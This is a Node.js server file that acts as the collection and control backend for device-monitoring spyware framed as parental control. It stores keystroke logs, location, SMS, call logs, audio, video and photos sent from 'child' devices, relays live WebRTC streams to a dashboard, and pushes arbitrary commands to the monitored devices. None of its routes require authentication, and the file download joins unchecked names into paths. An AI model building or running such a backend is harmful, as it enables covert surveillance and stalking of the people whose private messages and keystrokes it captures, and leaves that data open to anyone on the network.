const WebSocket = require("ws");
const express = require("express");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const storageDir = path.join(__dirname, "storage", "child_device_001");

// Ensure storage directory exists
if (!fs.existsSync(storageDir)) {
  fs.mkdirSync(storageDir, { recursive: true });
  console.log("LOG: Created storage directory:", storageDir);
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// API to list storage contents
app.get("/api/storage", (req, res) => {
  try {
    const files = fs.readdirSync(storageDir).map((file) => ({
      name: file,
      path: `/storage/${file}`,
      size: fs.statSync(path.join(storageDir, file)).size,
      type: file.endsWith(".json")
        ? "log"
        : file.endsWith(".opus")
        ? "audio"
        : file.endsWith(".mp4")
        ? "video"
        : "image",
    }));
    console.log("LOG: Fetched storage file list");
    res.json(files);
  } catch (e) {
    console.error("ERROR: Failed to list storage:", e.message);
    res.status(500).json({ error: "Failed to list storage" });
  }
});

// API to download files
app.get("/storage/:filename", (req, res) => {
  const filePath = path.join(storageDir, req.params.filename);
  if (fs.existsSync(filePath)) {
    console.log(`LOG: Downloading file ${req.params.filename}`);
    res.download(filePath);
  } else {
    console.warn(`WARN: File not found: ${req.params.filename}`);
    res.status(404).json({ error: "File not found" });
  }
});

// API to send commands to child clients
app.post("/api/command", (req, res) => {
  const { command } = req.body;
  if (!command) {
    console.warn("WARN: Command not provided");
    return res.status(400).json({ error: "Command required" });
  }

  let sent = false;
  wss.clients.forEach((client) => {
    if (
      client.readyState === WebSocket.OPEN &&
      clients.get(client) === "child"
    ) {
      client.send(JSON.stringify({ command }));
      sent = true;
      console.log(`LOG: Sent command to child: ${command}`);
    }
  });

  if (!sent) {
    console.warn("WARN: No connected child clients to send command");
  }

  res.json({ status: sent ? "Command sent" : "No child clients connected" });
});

// Serve React dashboard
app.get("*", (req, res) => {
  console.log(`LOG: Serving frontend to ${req.ip}`);
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start HTTP server
const server = app.listen(8080, '0.0.0.0', () => {
  console.log("LOG: Server running on http://192.168.0.102:8080");
});

// Initialize WebSocket server
const wss = new WebSocket.Server({ server });

// WebSocket handling
const clients = new Map();

wss.on("connection", (ws, req) => {
  const clientAddress = `${req.socket.remoteAddress}:${req.socket.remotePort}`;
  console.log(`LOG: WebSocket client connected from ${clientAddress}`);

  ws.on("message", (message) => {
    try {
      console.log(`LOG: Raw message from ${clientAddress}:`, message.toString());
      const parsed = JSON.parse(message);
      console.log(`LOG: Parsed message from ${clientAddress}:`, parsed);

      // Register client type
      if (parsed.clientType) {
        clients.set(ws, parsed.clientType);
        console.log(`LOG: Registered ${parsed.clientType} client from ${clientAddress}`);
        // Notify parent clients of new child connection
        if (parsed.clientType === "child") {
          wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
              client.send(JSON.stringify({ type: "child_connected", deviceId: parsed.deviceId || "unknown" }));
            }
          });
        }
        return;
      }

      // Handle WebRTC signaling
      if (parsed.type === "offer" || parsed.type === "answer" || parsed.type === "candidate") {
        console.log(`LOG: WebRTC ${parsed.type} received from ${clientAddress}`);
        wss.clients.forEach((client) => {
          if (
            client !== ws &&
            client.readyState === WebSocket.OPEN &&
            clients.get(client) === "parent"
          ) {
            client.send(JSON.stringify(parsed));
            console.log(`LOG: Sent WebRTC data to parent client from ${clientAddress}`);
          }
        });
        return;
      }

      // Handle logs and files
      const { deviceId, dataType, data, timestamp } = parsed;
      if (deviceId && dataType && data && timestamp) {
        if (dataType === "keylog" || dataType === "location" || dataType === "sms" || dataType === "call_log") {
          const logDir = path.join(__dirname, "storage", deviceId);
          if (!fs.existsSync(logDir)) {
            fs.mkdirSync(logDir, { recursive: true });
            console.log(`LOG: Created storage directory: ${logDir}`);
          }
          const logFile = path.join(logDir, `${dataType}.json`);
          let logs = [];

          if (fs.existsSync(logFile)) {
            logs = JSON.parse(fs.readFileSync(logFile));
          }

          logs.push({ deviceId, dataType, data, timestamp });
          fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
          console.log(`LOG: Appended log entry to ${logFile} from ${clientAddress}`);

          // Broadcast to parent clients
          wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
              client.send(JSON.stringify({ deviceId, dataType, data, timestamp }));
            }
          });
        } else if (dataType === "audio" || dataType === "video" || dataType === "image") {
          const logDir = path.join(__dirname, "storage", deviceId);
          if (!fs.existsSync(logDir)) {
            fs.mkdirSync(logDir, { recursive: true });
            console.log(`LOG: Created storage directory: ${logDir}`);
          }
          const extension = dataType === "audio" ? ".opus" : dataType === "video" ? ".mp4" : ".jpg";
          const filePath = path.join(logDir, `${dataType}_${timestamp}${extension}`);
          fs.writeFileSync(filePath, Buffer.from(data, "base64"));
          console.log(`LOG: Saved ${dataType} file to ${filePath} from ${clientAddress}`);

          // Notify parent clients
          wss.clients.forEach((client) => {
            if (client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
              client.send(JSON.stringify({ deviceId, dataType, file: `/storage/${dataType}_${timestamp}${extension}`, timestamp }));
            }
          });
        }
        console.log(`LOG: Processed ${dataType} data from ${clientAddress}`);
      } else {
        console.warn(`WARN: Invalid message format from ${clientAddress}`);
      }
    } catch (e) {
      console.error(`ERROR: Failed to process message from ${clientAddress}:`, e.message);
    }
  });

  ws.on("close", () => {
    clients.delete(ws);
    console.log(`LOG: WebSocket client disconnected from ${clientAddress}`);
  });

  ws.on("error", (err) => {
    console.error(`ERROR: WebSocket error from ${clientAddress}:`, err.message);
  });
});
